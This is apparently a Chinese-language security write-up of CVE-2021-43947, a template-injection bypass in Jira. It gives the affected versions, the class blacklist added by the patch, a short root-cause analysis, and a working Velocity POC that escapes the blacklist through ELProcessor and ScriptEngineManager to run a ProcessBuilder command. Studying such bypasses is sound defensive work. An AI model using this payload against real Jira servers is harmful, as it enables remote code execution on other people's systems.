- [CVE-2021-43947-模板注入](#cve-2021-43947-模板注入)
  - [影响版本](#影响版本)
  - [原理分析](#原理分析)
    - [javax.script.ScriptEngineManager](#javaxscriptscriptenginemanager)
    - [POC](#poc)
  - [参考](#参考)
# CVE-2021-43947-模板注入
该漏洞是针对CVE-2021-39115的绕过,这次补丁中在`velocity.properties`的黑名单中又新增了几个类
```
webwork.util.ValueStack,
javax.el.ELProcessor,
javax.script.ScriptEngineManager,
java.lang.ProcessBuilder,
javax.el.ImportHandler,
javax.el.ELManager
```
## 影响版本
* version < 8.13.15
* 8.14.0 ≤ version < 8.20.3
## 原理分析
还是利用jirautils.loadComponent,获取一个EL表达式对象,然后通过forName获取ScriptEngineManager类来执行JavaScript函数RCE.
### javax.script.ScriptEngineManager
ScriptEngineManager是JAVA6加入的JavaScript语言的脚本引擎.
可以通过三种方式来获取引擎:
脚本名称: `ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");` 
文件拓展名: `ScriptEngine engine = new ScriptEngineManager().getEngineByExtension("js"); `
MIME类型: `ScriptEngine engine = new ScriptEngineManager().getEngineByMimeType("text/javascript");`
### POC
```vm
#set ($elparser = $jirautils.loadComponent('javax.el.ELProcessor',$i18n.getClass()))
#set ($code = "{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(|new java.lang.ProcessBuilder['(java.lang.String[])'](['touch','/tmp/poc']).start()|)}")
#set ($code = $code.replace('|', '"'))
$elparser.eval($code)
```
## 参考
https://jira.atlassian.com/browse/JRASERVER-73067
